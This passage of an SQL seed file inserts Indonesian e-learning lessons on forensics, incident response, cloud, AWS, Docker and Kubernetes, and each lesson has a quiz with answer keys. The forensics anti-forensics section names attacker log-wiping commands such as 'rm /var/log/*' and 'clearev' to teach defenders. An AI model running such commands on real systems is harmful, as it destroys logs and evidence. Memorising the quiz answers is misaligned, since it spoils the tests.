- Dapat dijelaskan ke pihak non-teknis (hakim, manajemen).

## Artefak Forensik Penting

### Windows
- **MFT** (Master File Table) — metadata semua file.
- **Prefetch** — aplikasi yang pernah dijalankan.
- **Registry** — USBSTOR, Run keys, Shellbags.
- **Event Logs** — Security, System, Application (`.evtx`).
- **SRUM** — resource usage per aplikasi.
- **Browser history** — Chrome SQLite, IE WebCacheV01.dat.

### Linux
- `/var/log/` — auth.log, syslog, audit.log.
- `~/.bash_history`, `~/.zsh_history`.
- `/tmp`, `/var/tmp` — artefak sementara.
- cron (`/etc/cron*`, `/var/spool/cron`).
- systemd journal (`journalctl`).

```bash
# Timeline analysis dengan log2timeline (Plaso)
log2timeline.py /evidence/plaso.dump /evidence/disk.dd
psort.py -o l2tcsv -w timeline.csv /evidence/plaso.dump
```

## Anti-Forensics & Tantangan

Penyerang berusaha menghapus jejak:
- Bersih-bersih log (`clearev`, `rm /var/log/*`).
- Timestamping (ubah mtime file).
- Steganography (sembunyikan data di gambar/audio).
- Fileless malware di memori saja.
- Full disk encryption (BitLocker, FileVault, LUKS) — butuh key recovery.

Forensiker perlu memahami cara mengatasi setiap teknik, misalnya via Volatility untuk memory analysis atau mendekripsi dengan key dari TPM.

## Tips & Best Practices

- Selalu kerja di salinan (image), jangan di bukti asli.
- Dokumentasikan setiap langkah dengan timestamp.
- Gunakan write blocker hardware saat mengakuisisi disk.
- Latih forensic readiness: log retention, central SIEM, EDR dengan telemetry.
- Siapkan playbook insiden + kontak forensik pihak ketiga.

## Kesimpulan

Digital forensics adalah perpaduan ilmu, prosedur hukum, dan keterampilan teknis. Disiplin ini memastikan kebenaran dapat dibuktikan di pengadilan atau investigasi internal. Dengan metodologi yang ketat, tools yang tepat, dan dokumentasi yang teliti, forensiker mengubah kekacauan pasca-insiden menjadi fakta yang dapat dipertahankan—dan inilah yang membedakan spekulasi dari bukti.



## Studi Kasus: Security Audit

Reconnaissance, Scanning, Testing, Exploitation, Reporting.

## Tips

> Hanya uji sistem yang Anda miliki atau punya izin tertulis.', '🔬', false, '[{"question":"Prinsip mencatat setiap perpindahan bukti digital disebut?","options":["Chain of custody","Best evidence","Locard''s principle","Rule 702"],"answer":0,"explanation":"Chain of custody mencatat siapa/kapan/di mana bukti diperlakukan."},{"question":"Tools utama untuk analisis memori (RAM) forensik?","options":["Volatility","Nmap","Burp Suite","Metasploit"],"answer":0,"explanation":"Volatility (v3) adalah framework standar untuk memory forensik."},{"question":"Hash yang umum dipakai untuk verifikasi integritas image forensik?","options":["CRC32","SHA-256","Base64","ROT13"],"answer":1,"explanation":"SHA-256 adalah standar untuk verifikasi integritas bukti digital."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('incident-response', 6, 14, 'Incident Response', 'incident-response', 'Siklus IR, playbook, dan koordinasi saat krisis keamanan.', '# Incident Response


![Incident Response](https://sfile.chatglm.cn/images-ppt/02236e640fdd.jpg)

**Incident Response (IR)** adalah pendekatan terstruktur untuk menangani pelanggaran keamanan, serangan siber, atau insiden layanan. Tujuannya: membatasi dampak, memulihkan operasi secepat mungkin, dan mengambil pelajaran. Tanpa IR yang matang, satu insiden kecil dapat berubah menjadi bencana reputasi dan finansial. IR bukan reaksi panik—ia adalah proses yang dilatih, didokumentasikan, dan diuji.

![Incident Response](https://sfile.chatglm.cn/images-ppt/cdb300ed8989.jpg)

## Siklus NIST SP 800-61

### 1. Preparation
- Bentuk CSIRT (Computer Security Incident Response Team) dengan peran jelas: Incident Commander, Communicator, Scribe, SME, Legal.
- Buat playbook per jenis insiden (phishing, ransomware, DDoS, BEC).
- Siapkan tools (EDR, SIEM, forensic kit, out-of-band communication).
- Latih table-top exercise rutin (minimal tahunan).
- Daftar kontak escalation (vendor, CERT-ID, law enforcement).

### 2. Detection & Analysis
- Sumber deteksi: SIEM alert, EDR, user report, threat intel, partner.
- Triage: validasi true positive, tentukan severity, klasifikasi jenis.
- Indikator kompromi (IoC): hash file, IP C2, domain, mutex, registry key.
- Buat timeline awal dan cakupan insiden.

```bash
# Contoh triage EDR (segmen per host)
crowdstrike-falcon batch-query --filter "hostname:*-ws-*"

# Cek IoC di log proxy
grep -E "(45\.227\.255\.206|malicious\.example)" /var/log/squid/access.log

# Pivot ke SIEM (Splunk SPL)
index=proxy (src=10.0.0.0/8) (dest_ip=45.227.255.206 OR dest_host="malicious.example")
```

### 3. Containment
Pembatasan penyebaran, dengan dua strategi:

- **Short-term containment** — isolasi host (network quarantine), disable account, block domain di firewall.
- **Long-term containment** — sistem tetap berjalan tapi ditambal sementara (mis. disable service yang dieksploitasi).

```bash
# Network isolation via EDR atau switch port
ip link set eth0 down             # crude, but works
# Atau via iptables hanya allow SOC
iptables -A INPUT -s 10.99.0.5 -j ACCEPT
iptables -P INPUT DROP
```

### 4. Eradication
Hapus akar penyebab agar tidak reinfeksi:

- Hapus malware & persistence (scheduled task, service, registry).
- Disable akun terkompromi, reset semua kredensial yang terkait.
- Patch kerentanan yang dieksploitasi.
- Rebuild sistem kritis dari image bersih (jangan cleaning in-place untuk sistem penting).

### 5. Recovery
Kembalikan layanan secara bertahap:

- Restore dari backup bersih, verifikasi integritas.
- Validasi monitoring enhanced pada sistem yang dipulihkan.
- Phased rollout: non-kritis → kritis, dengan rollback plan.
- Watch period (72-168 jam) untuk memastikan tidak reinfeksi.

### 6. Post-Incident Activity (Lessons Learned)
- **Post-mortem meeting** 1-2 minggu setelah resolusi.
- **Blameless** culture: fokus pada sistem, bukan individu.
- Dokumentasi: timeline, IoC, root cause, dampak, mitigasi.
- Update playbook, detection rule, dan kontrol berdasarkan pelajaran.

## Severity & Escalation Matrix

```text
SEV-1 (Critical):
  - Layanan publik down / data sensitif bocor massal
  - Response: < 15 menit, eskalasi ke CISO & Legal
  - Komunikasi: eksekutif, regulator (jika wajib), publik

SEV-2 (High):
  - Layanan internal terganggu, data sensitif terbatas
  - Response: < 1 jam

SEV-3 (Medium):
  - Infeksi endpoint tunggal, no data exfil
  - Response: < 4 jam

SEV-4 (Low):
  - Phishing email tanpa klik, malware di-quarantine
  - Response: < 24 jam
```

## Komunikasi Krisis

Salah satu bagian tersulit IR adalah komunikasi:

- **Internal**: status update terjadwal (mis. setiap 2 jam saat SEV-1).
- **Eksekutif**: ringkasan bisnis (dampak, ETA, keputusan yang dibutuhkan).
- **Legal & Compliance**: notifikasi regulator dalam SLA (UU PDP 3x24 jam untuk breach serius).
- **Pelanggan**: transparan, jujur, tanpa spekulasi.
- **Publik/Press**: hanya via juru bicara resmi.

```text
Template update internal:
[SEV-1 RANSOMWARE] Update #3 — 14:30 WIB
Status: Containment 80% selesai
Affected: 12 server, 300 endpoint
No evidence of data exfiltration (under investigation)
Next update: 16:30 WIB
Incident Commander: Budi
```

## Tools IR Modern

- **EDR/XDR**: CrowdStrike, SentinelOne, Defender for Endpoint.
- **SIEM/SOAR**: Splunk, Elastic, Sentinel, Cortex XSOAR, Tines.
- **Threat Intelligence**: MISP, VirusTotal, AlienVault OTX.
- **Forensics**: Volatility, Velociraptor, KAPE, GRR.
- **Communication**: dedicated out-of-band (Signal, Slack workspace IR).

## Tips & Best Practices

- Latih table-top exercise minimal 2x setahun dengan skenario berbeda.
- Maintain runbook per jenis serangan (ransomware, phishing, BEC, insider).
- Punya offline backup immutable (air-gapped atau WORM S3).
- Pre-negotiate retainer dengan firma IR pihak ketiga.
- Integrasikan threat intel feed untuk deteksi proaktif.

## Kesimpulan

Incident Response matang membedakan organisasi yang survive dari yang collapse saat krisis. Dengan persiapan, deteksi cepat, containment disiplin, dan komunikasi transparan, dampak insiden dapat diminimalkan. Yang terpenting: **belajar dari setiap insiden**—setiap breach adalah guru berharga yang membentuk pertahanan masa depan.



## Studi Kasus: Security Audit

Reconnaissance, Scanning, Testing, Exploitation, Reporting.

## Tips

> Hanya uji sistem yang Anda miliki atau punya izin tertulis.', '🚨', false, '[{"question":"Berapa fase incident response menurut NIST SP 800-61?","options":["3","4","6","10"],"answer":2,"explanation":"NIST SP 800-61: Preparation, Detection & Analysis, Containment, Eradication, Recovery, Post-Incident."},{"question":"Severity untuk layanan publik down dan data sensitif bocor massal?","options":["SEV-4","SEV-3","SEV-2","SEV-1"],"answer":3,"explanation":"SEV-1 (Critical) untuk dampak luas pada publik dan data sensitif."},{"question":"Pendekatan budaya dalam post-mortem IR yang direkomendasikan?","options":["Blame-driven","Blameless","Confidential","Punitive"],"answer":1,"explanation":"Blameless culture fokus pada sistem dan proses, bukan menyalahkan individu."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('cloud-computing-basics', 7, 1, 'Cloud Computing Basics', 'cloud-computing-basics', 'Model layanan IaaS/PaaS/SaaS, deployment, dan karakteristik cloud.', '# Cloud Computing Basics


![Cloud Computing Basics](https://sfile.chatglm.cn/images-ppt/1328eb2e4cb1.jpeg)

**Cloud computing** adalah model pengiriman layanan komputasi—server, storage, database, networking, software—melalui internet dengan model pay-as-you-go. Alih-alih membeli dan memelihara hardware sendiri, organisasi menyewa sumber daya dari penyedia cloud (AWS, Azure, GCP, Alibaba, IBM Cloud). Cloud telah mengubah cara aplikasi dirancang, d skalakan, dan dioperasikan.

![Cloud Computing Basics](https://sfile.chatglm.cn/images-ppt/631c50fce301.jpg)

## Karakteristik Esensial Cloud (NIST)

1. **On-demand self-service** — pengguna menyediakan resource tanpa interaksi manusia dengan provider.
2. **Broad network access** — akses via internet dari berbagai perangkat.
3. **Resource pooling** — resource fisik dipakai bersama multi-tenant secara terisolasi.
4. **Rapid elasticity** — scale up/down cepat sesuai beban.
5. **Measured service** — billing berdasarkan konsumsi (metered).

## Model Layanan Cloud

### IaaS (Infrastructure as a Service)
Penyedia menyediakan VM, storage, network. Anda mengelola OS ke atas. Contoh: AWS EC2, Azure VM, GCP Compute Engine, DigitalOcean Droplet.

```bash
# Provision EC2 dengan AWS CLI
aws ec2 run-instances \
  --image-id ami-0c55b159cbfafe1f0 \
  --instance-type t3.micro \
  --key-name my-key \
  --security-group-ids sg-12345 \
  --subnet-id subnet-67890
```

### PaaS (Platform as a Service)
Penyedia mengelola runtime, OS, dan infrastruktur. Anda fokus kode. Contoh: Heroku, Google App Engine, AWS Elastic Beanstalk, Azure App Service.

```yaml
# app.yaml untuk Google App Engine
runtime: nodejs20
instance_class: F2
automatic_scaling:
  min_instances: 1
  max_instances: 10
env_variables:
  NODE_ENV: production
```

### SaaS (Software as a Service)
Aplikasi jadi yang diakses via browser/API. Contoh: Gmail, Office 365, Salesforce, Slack, Notion.

### Model Baru
- **FaaS/Serverless**: AWS Lambda, Cloud Functions, Azure Functions.
- **CaaS (Container as a Service)**: ECS, GKE Autopilot, Azure Container Apps.
- **DBaaS**: RDS, Cloud SQL, Cosmos DB.

## Model Deployment Cloud

| Model | Deskripsi | Contoh |
|-------|-----------|--------|
| **Public** | Infrastruktur dimiliki provider, multi-tenant | AWS, Azure, GCP |
| **Private** | Cloud untuk satu organisasi (on-prem atau hosted) | OpenStack, VMware Cloud Foundation |
| **Hybrid** | Kombinasi public + private dengan orchestration | AWS Outposts, Azure Arc |
| **Multi-cloud** | Menggunakan beberapa provider sekaligus | AWS + GCP + Azure |
| **Community** | Shared untuk komunitas tertentu | GovCloud, healthcare consortium |

## Shared Responsibility Model

Pembagian tanggung jawab keamanan antara provider dan konsumen:

```text
                IaaS        PaaS        SaaS
Provider:       Physical    Physical    Physical
                Network     Network     Network
                Host        Host        Host
                ...         OS          OS
                ...         Runtime     Runtime
                            App (patch) App (config)
Konsumen:       OS          Data        Data
                Runtime     Identity    Identity
                App
                Data
                Identity
```

Misinterpretasi model ini adalah penyebab utama insiden cloud (mis. S3 bucket terbuka = tanggung jawab konsumen, bukan AWS).

## Arsitektur Cloud Modern

- **Multi-AZ** — deploy ke beberapa Availability Zone untuk HA.
- **Auto-scaling** — tambah/kurangi instance berdasarkan metrik.
- **Load balancing** — distribusi traffic (ALB/NLB).
- **CDN** — cache konten di edge (CloudFront, Cloudflare).
- **Microservices** — dekomposisi monolith menjadi service kecil.
- **Managed services** — gunakan RDS vs self-hosted PostgreSQL untuk kurangi beban operasional.

## Estimasi Biaya Cloud

```bash
# Estimasi biaya bulanan EC2 t3.medium (us-east-1, ~$30.37/month On-Demand)
aws pricing get-products \
  --service-code AmazonEC2 \
  --filters Type=TERM_MATCH,Field=instanceType,Value=t3.medium \
            Type=TERM_MATCH,Field=location,Value="US East (N. Virginia)" \
  --query ''PriceList[0]'' --output text | jq .

# Aktifkan Cost Explorer
aws ce get-cost-and-usage \
  --time-period Start=2024-01-01,End=2024-02-01 \
  --granularity MONTHLY --metrics BlendedCost \
  --group-by Type=DIMENSION,Key=Service
```

## Keuntungan & Tantangan Cloud

**Keuntungan**:
- Capex → Opex, biaya sesuai pemakaian.
- Skalabilitas global dalam menit.
- Akses ke layanan terbaru (AI, quantum, IoT).
- Tanggung jawab keamanan sebagian dipindah ke provider.

**Tantangan**:
- Vendor lock-in.
- Biaya dapat meledak tanpa governance (FinOps).
- Skill gap pada tim operasional.
- Kepatuuhan data (residency, sovereignty).

## Tips & Best Practices

- Terapkan **Well-Architected Framework** (5 pilar: operational, security, reliability, performance, cost).
- Gunakan **Infrastructure as Code** (Terraform, Pulumi, CloudFormation).
- Aktifkan **MFA** untuk semua akun root dan IAM.
- Tag semua resource untuk cost allocation.
- Gunakan **landing zone** (AWS Control Tower, Azure Landing Zones) untuk multi-account.

## Kesimpulan

Cloud computing adalah paradigma yang memungkinkan inovasi cepat dan skalabilitas global. Memahami model layanan (IaaS/PaaS/SaaS), shared responsibility, dan arsitektur modern adalah fondasi untuk membangun sistem yang andal, aman, dan efisien di cloud. Cloud bukan tentang "memindahkan server", tetapi **merancang ulang** cara kita berpikir tentang komputasi.



## Studi Kasus: Deploy ke Production

Docker, Kubernetes, CI/CD.

## Tips

> Kuasai Linux sebelum Docker/K8s.', '☁️', false, '[{"question":"Model cloud yang menyediakan VM, storage, network (OS dikelola konsumen)?","options":["SaaS","PaaS","IaaS","FaaS"],"answer":2,"explanation":"IaaS menyediakan infrastruktur dasar; OS ke atas dikelola konsumen."},{"question":"Siapa yang bertanggung jawab konfigurasi S3 bucket public access?","options":["AWS provider","Konsumen (akun owner)","Hardware vendor","Pemerintah"],"answer":1,"explanation":"Konfigurasi resource adalah tanggung jawab konsumen dalam shared responsibility model."},{"question":"Pilar yang TIDAK termasuk AWS Well-Architected Framework?","options":["Security","Cost Optimization","Marketing","Reliability"],"answer":2,"explanation":"5 pilar: Operational, Security, Reliability, Performance, Cost. Marketing bukan pilar."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('aws-cloud-services', 7, 2, 'AWS & Cloud Services', 'aws-cloud-services', 'Layanan utama AWS: EC2, S3, RDS, IAM, dan arsitektur cloud.', '# AWS & Cloud Services


![AWS & Cloud Services](https://sfile.chatglm.cn/images-ppt/1328eb2e4cb1.jpeg)

**Amazon Web Services (AWS)** adalah penyedia cloud terbesar di dunia dengan ratusan layanan. Mendominasi pasar sejak peluncuran EC2 pada 2006, AWS menyediakan layanan komputasi, storage, database, AI, networking, hingga satelit. Memahami layanan inti AWS adalah keterampilan wajib bagi cloud engineer dan architect modern.

![AWS & Cloud Services](https://sfile.chatglm.cn/images-ppt/631c50fce301.jpg)

## Region, AZ, dan Edge Location

- **Region** — klaster geografis (us-east-1 N. Virginia, ap-southeast-1 Singapore, dst). Pilih untuk latency, compliance, dan DR.
- **Availability Zone (AZ)** — data center terpisah dalam region (1+ building, power, network). Min 3 AZ per region.
- **Edge Location** — POP CDN CloudFront, lebih banyak dari AZ untuk caching global.

## Layanan Komputasi

### EC2 (Elastic Compute Cloud)
Virtual server dengan berbagai instance type:
- General purpose: t3, m6i
- Compute optimized: c6i
- Memory: r6i, x2iezn
- GPU: p4d, g5 (ML/rendering)
- ARM Graviton: c7g (hemat ~40% biaya)

```bash
# Launch EC2 dengan user-data script
aws ec2 run-instances \
  --image-id ami-0c55b159cbfafe1f0 \
  --instance-type t3.micro \
  --user-data file://userdata.sh \
  --tag-specifications "ResourceType=instance,Tags=[{Key=Name,Value=web}]"

userdata.sh:
#!/bin/bash
yum install -y httpd
systemctl enable --now httpd
```

### Lambda (Serverless)
Jalankan kode tanpa mengelola server. Cocok untuk event-driven, beban tak menentu.

```python
# Lambda Python handler
import json
def lambda_handler(event, context):
    return {
        ''statusCode'': 200,
        ''body'': json.dumps({''message'': ''hello from lambda''})
    }
```

### Lainnya
- **ECS/EKS**: container orchestration (Docker/Kubernetes managed).
- **Fargate**: serverless container.
- **Lightsail**: VPS sederhana untuk small business.
- **Batch**: job computing besar.

## Storage

### S3 (Simple Storage Service)
Object storage, 99.999999999% (11 9s) durability. Use cases: static website, backup, data lake, CDN origin.

```bash
# Buat bucket + upload
aws s3 mb s3://my-bucket-unique-name
aws s3 cp file.txt s3://my-bucket-unique-name/

# Static website
aws s3 website s3://my-bucket-unique-name/ --index-document index.html

# Block public access (recommended default)
aws s3api put-public-access-block \
  --bucket my-bucket-unique-name \
  --public-access-block-configuration BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true
```

### Lainnya
- **EBS**: block storage untuk EC2.
- **EFS**: shared file system NFS.
- **Glacier**: arsip murah, retrieval lambat.
- **FSx**: Windows file system, Lustre.

## Database

- **RDS**: MySQL, PostgreSQL, MariaDB, SQL Server, Oracle (managed).
- **Aurora**: MySQL/PostgreSQL compatible, cloud-native, multi-AZ HA.
- **DynamoDB**: NoSQL key-value, serverless, single-digit ms latency.
- **ElastiCache**: Redis/Memcached managed.
- **Redshift**: data warehouse kolom.

```bash
# Provision RDS PostgreSQL
aws rds create-db-instance \
  --db-instance-identifier prod-db \
  --db-instance-class db.t3.micro \
  --engine postgres \
  --master-username admin \
  --master-user-password $(aws secretsmanager get-random-password --exclude-characters ''"@/\'' --query RandomPassword --output text) \
  --allocated-storage 20 \
  --backup-retention-period 7 \
  --multi-az
```

## Networking

### VPC (Virtual Private Cloud)
Jaringan terisolasi di AWS. Komponen: subnet (public/private), route table, internet gateway, NAT gateway, security group, NACL.

```yaml
# VPC dengan Terraform
resource "aws_vpc" "main" {
  cidr_block = "10.0.0.0/16"
  enable_dns_hostnames = true
  tags = { Name = "prod-vpc" }
}
resource "aws_subnet" "public_a" {
  vpc_id            = aws_vpc.main.id
  cidr_block        = "10.0.1.0/24"
  availability_zone = "ap-southeast-1a"
  map_public_ip_on_launch = true
}
```

### Lainnya
- **CloudFront**: CDN global.
- **Route 53**: DNS managed.
- **ALB/NLB**: load balancer L7/L4.
- **Direct Connect**: dedicated line ke AWS.
- **Transit Gateway**: hub antar VPC.

## IAM (Identity & Access Management)

Konsep: **principal** (user/role) → **action** (API) → **resource** (ARN). **Policy** JSON mendefinisikan izin.

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": ["s3:GetObject", "s3:PutObject"],
    "Resource": "arn:aws:s3:::my-bucket/*"
  }]
}
```

Best practice: gunakan **IAM Role** untuk service EC2/Lambda (bukan access key hardcoded), MFA di root, password policy, dan SCP di Organizations.

## Keamanan

- **KMS**: key management service (envelope encryption).
- **Secrets Manager / Parameter Store**: vault kredensial.
- **WAF & Shield**: proteksi DDoS dan application-layer.
- **GuardDuty**: threat detection berbasis ML.
- **Macie**: data discovery (PII).
- **Security Hub**: aggregated compliance posture.

## Monitoring & DevOps

- **CloudWatch**: metrics, logs, alarms.
- **CloudTrail**: audit API calls (semua action).
- **X-Ray**: distributed tracing.
- **CodeCommit/CodeBuild/CodeDeploy/CodePipeline**: CI/CD native.

```bash
# CloudTrail event query
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=RunInstances \
  --max-results 10
```

## Tips & Best Practices

- Aktifkan MFA di root dan IAM user.
- Gunakan AWS Organizations + SCP untuk governance multi-account.
- Tag semua resource; aktifkan Cost Explorer + Budgets.
- Encrypt EBS/S3/RDS default; rotasi KMS key.
- Use Well-Architected Tool review berkala.
- Pilih Graviton (ARM) untuk workload compatible—hemat signifikan.

## Kesimpulan

AWS menawarkan ekosistem luas untuk membangun aplikasi modern. Kunci menguasai AWS bukan menghafal ratusan layanan, tetapi memahami prinsip shared responsibility, well-architected, dan memilih layanan managed untuk mengurangi beban operasional. Mulai dari EC2/S3/IAM sebagai fondasi, lalu eksplorasi serverless dan managed database sesuai kebutuhan workload.



## Studi Kasus: Deploy ke Production

Docker, Kubernetes, CI/CD.

## Tips

> Kuasai Linux sebelum Docker/K8s.', '🟧', false, '[{"question":"Layanan AWS untuk object storage?","options":["EBS","S3","EFS","RDS"],"answer":1,"explanation":"Amazon S3 (Simple Storage Service) adalah object storage AWS."},{"question":"Yang harus dipakai EC2 agar dapat akses S3 tanpa access key?","options":["Hardcode key","IAM Role","Root credential","Environment variable"],"answer":1,"explanation":"IAM Role attach ke EC2 memberi temporary credential via metadata service."},{"question":"Layanan AWS untuk audit API call (compliance)?","options":["CloudWatch","CloudTrail","X-Ray","Config"],"answer":1,"explanation":"CloudTrail mencatat semua API call ke akun AWS untuk audit."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('docker-containerization', 7, 3, 'Docker & Containerization', 'docker-containerization', 'Container, image, Dockerfile, dan best practices Docker.', '# Docker & Containerization


![Docker & Containerization](https://sfile.chatglm.cn/images-ppt/015de1c2cc89.webp)

**Docker** adalah platform containerization yang memaketkan aplikasi beserta dependency-nya menjadi unit portable yang dapat berjalan konsisten di mana saja. Berbeda dengan VM yang memvirtualisasi hardware, container berbagi kernel OS host—jauh lebih ringan, start cepat, dan efisien sumber daya. Docker telah merevolusi cara developer membangun, mengirim, dan menjalankan aplikasi.

![Docker & Containerization](https://sfile.chatglm.cn/images-ppt/631c50fce301.jpg)

## Konsep Inti

- **Image** — template read-only berisi aplikasi + dependency. Dibangun dari Dockerfile.
- **Container** — instance running dari image. Isolasi via namespace + cgroups (Linux).
- **Dockerfile** — script deklaratif untuk membangun image.
- **Registry** — tempat menyimpan/distribusi image (Docker Hub, ECR, GCR, Harbor).
- **Volume** — persistent storage untuk container.
- **Network** — jaringan virtual antar container.

## Container vs Virtual Machine

| Aspek | VM | Container |
|-------|-----|-----------|
| Isolasi | Hardware-level | OS-level (namespace) |
| Ukuran image | GB | MB |
| Boot time | Menit | Detik |
| Density | Beberapa per host | Ratusan per host |
| Sharing kernel | Tidak | Ya |
| Use case | Strong isolation | Microservice, CI/CD |

## Dockerfile

```dockerfile
# Multi-stage build untuk image kecil & aman
FROM node:20-alpine AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci --production
COPY . .
RUN npm run build

FROM node:20-alpine AS runtime
WORKDIR /app
ENV NODE_ENV=production
RUN addgroup -S app && adduser -S app -G app
COPY --from=builder /app/node_modules ./node_modules
COPY --from=builder /app/dist ./dist
COPY --from=builder /app/package.json ./
USER app
EXPOSE 3000
HEALTHCHECK --interval=30s CMD wget -qO- http://localhost:3000/health || exit 1
CMD ["node", "dist/main.js"]
```

## Perintah Dasar Docker

```bash
# Build image
docker build -t myapp:1.0 .

# Run container
docker run -d --name api -p 8080:3000 \
  --env-file .env \
  -v $(pwd)/data:/app/data \
  --restart unless-stopped \
  myapp:1.0

# List & inspect
docker ps -a
docker logs -f api
docker exec -it api sh
docker stats

# Image management
docker images
docker image prune -a    # hapus yang tidak terpakai
docker system prune -a --volumes  # bersih-bersih total

# Push ke registry
docker tag myapp:1.0 registry.example.com/myapp:1.0
docker push registry.example.com/myapp:1.0
```

## Docker Compose (Multi-container)

```yaml
# docker-compose.yml
version: "3.9"
services:
  web:
    build: .
    ports: ["8080:3000"]
    environment:
      DATABASE_URL: postgresql://app:secret@db:5432/app
    depends_on:
      db:
        condition: service_healthy
    restart: unless-stopped
  db:
    image: postgres:16-alpine
    environment:
      POSTGRES_USER: app
      POSTGRES_PASSWORD: secret
      POSTGRES_DB: app
    volumes:
      - pgdata:/var/lib/postgresql/data
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U app"]
      interval: 5s
      timeout: 3s
      retries: 5
volumes:
  pgdata:
```

```bash
docker compose up -d
docker compose logs -f web
docker compose down -v   # hapus container + volume
```

## Storage & Volume

- **bind mount**: `-v /host/path:/container/path` (untuk dev, sharing file).
- **named volume**: `-v pgdata:/var/lib/postgresql/data` (managed Docker, portable).
- **tmpfs**: in-memory, untuk secret.

## Networking

Driver jaringan Docker:
- **bridge** (default) — internal Docker network.
- **host** — container pakai network host (kurang aman, no isolation).
- **none** — isolated, no networking.
- **overlay** — multi-host (Swarm/K8s).

```bash
# Buat network custom
docker network create --driver bridge mynet
docker run -d --network mynet --name api myapp
docker run -d --network mynet --name db postgres
# Container dapat resolve via DNS: api, db
```

## Keamanan Container

1. **Non-root user** — gunakan USER directive.
2. **Read-only filesystem** — `--read-only` + tmpfs untuk yang perlu writable.
3. **Drop capabilities** — `--cap-drop ALL --cap-add NET_BIND_SERVICE`.
4. **Limit resources** — `--memory=512m --cpus=0.5`.
5. **Scan image** — Trivy, Grype, Snyk untuk CVE.
6. **Minimal base image** — Alpine atau distroless.
7. **Sign image** — Cosign (Sigstore).

```bash
# Scan dengan Trivy
trivy image myapp:1.0

# Run dengan hardening
docker run -d \
  --read-only \
  --tmpfs /tmp \
  --cap-drop ALL \
  --security-opt no-new-privileges \
  --memory=512m --cpus=0.5 \
  myapp:1.0
```

## Optimasi Image

- **Multi-stage build** — image akhir hanya berisi binary + dependency runtime.
- **Cache layer** — urutkan instruksi dari yang paling jarang berubah (COPY package.json sebelum COPY .).
- **.dockerignore** — exclude node_modules, .git, file dev.
- **Alpine / distroless** — base image kecil dan minim attack surface.
- **Reproducible build** — `--build-arg BUILDKIT=1` dengan cache mount.

## Tips & Best Practices

- Satu container = satu proses utama.
- Log ke stdout/stderr (twelve-factor app).
- Konfigurasi via environment variable, bukan hard-code.
- Tag image dengan semantic version + git SHA, hindari `latest` di production.
- Lakukan image scan di CI sebelum push.
- Gunakan Docker BuildKit (default di Docker 23+) untuk build lebih cepat.

## Kesimpulan

Docker memungkinkan developer "build once, run anywhere". Dengan memahami Dockerfile, multi-stage build, compose, dan praktik keamanan, Anda dapat membangun aplikasi yang portable, efisien, dan aman. Container adalah blok bangunan microservice modern—dan Docker adalah tools de facto untuk membangun blok tersebut.



## Studi Kasus: Deploy ke Production

Docker, Kubernetes, CI/CD.

## Tips

> Kuasai Linux sebelum Docker/K8s.', '🐳', false, '[{"question":"Perbedaan utama container vs VM?","options":["Container butuh OS sendiri","Container sharing kernel host","VM lebih ringan","Tidak ada bedanya"],"answer":1,"explanation":"Container berbagi kernel host via namespace, sehingga lebih ringan dari VM."},{"question":"Strategi Dockerfile untuk image akhir kecil dan aman?","options":["Single stage dengan ubuntu","Multi-stage build","Pakai image latest","Tanpa USER directive"],"answer":1,"explanation":"Multi-stage build mengcopy hanya artifact final ke image runtime kecil."},{"question":"Best practice user di container production?","options":["Root","Non-root user","Sudo group","Tidak perlu user"],"answer":1,"explanation":"Jalankan container sebagai non-root user untuk membatasi dampak kompromi."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('kubernetes-orchestration', 7, 4, 'Kubernetes Orchestration', 'kubernetes-orchestration', 'Pod, Deployment, Service, dan orchestration di Kubernetes.', '# Kubernetes Orchestration


![Kubernetes Orchestration](https://sfile.chatglm.cn/images-ppt/66f09b9941cd.jpg)

**Kubernetes (K8s)** adalah platform open-source untuk orchestrasi container yang berasal dari Google. K8s mengotomatiskan deployment, scaling, dan manajemen aplikasi containerized di skala besar. Saat aplikasi tumbuh dari puluhan menjadi ribuan container lintas beberapa node, diperlukan orchestrator—dan K8s adalah standar industri.

![Kubernetes Orchestration](https://sfile.chatglm.cn/images-ppt/631c50fce301.jpg)

## Arsitektur Kubernetes

### Control Plane (Master)
- **API Server** — entry point semua perintah (kubectl, dashboard).
- **etcd** — key-value store konsisten (state cluster).
- **Scheduler** — memilih node untuk Pod baru.
- **Controller Manager** — menjaga desired state (Deployment, ReplicaSet).
- **Cloud Controller** — integrasi dengan cloud provider.

### Worker Node
- **kubelet** — agent yang memastikan container running sesuai spec.
- **kube-proxy** — networking & load balancing antar Pod.
- **Container Runtime** — containerd, CRI-O (Docker deprecated sejak v1.24).

## Objek Inti Kubernetes

### Pod
Unit terkecil yang dapat di-deploy. Satu atau lebih container yang share network namespace & storage.

### Deployment
Mengelola ReplicaSet untuk memastikan jumlah Pod replika yang diinginkan.

```yaml
# deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: api
  labels: {app: api}
spec:
  replicas: 3
  selector:
    matchLabels: {app: api}
  strategy:
    type: RollingUpdate
    rollingUpdate:
      maxSurge: 1
      maxUnavailable: 0
  template:
    metadata:
      labels: {app: api}
    spec:
      containers:
      - name: api
        image: registry.example.com/api:v1.2.3
        ports: [{containerPort: 3000}]
        env:
        - name: DATABASE_URL
          valueFrom: {secretKeyRef: {name: db-secret, key: url}}
        resources:
          requests: {cpu: 100m, memory: 128Mi}
          limits: {cpu: 500m, memory: 512Mi}
        livenessProbe:
          httpGet: {path: /health, port: 3000}
          initialDelaySeconds: 10
          periodSeconds: 10
        readinessProbe:
          httpGet: {path: /ready, port: 3000}
          periodSeconds: 5
```

### Service
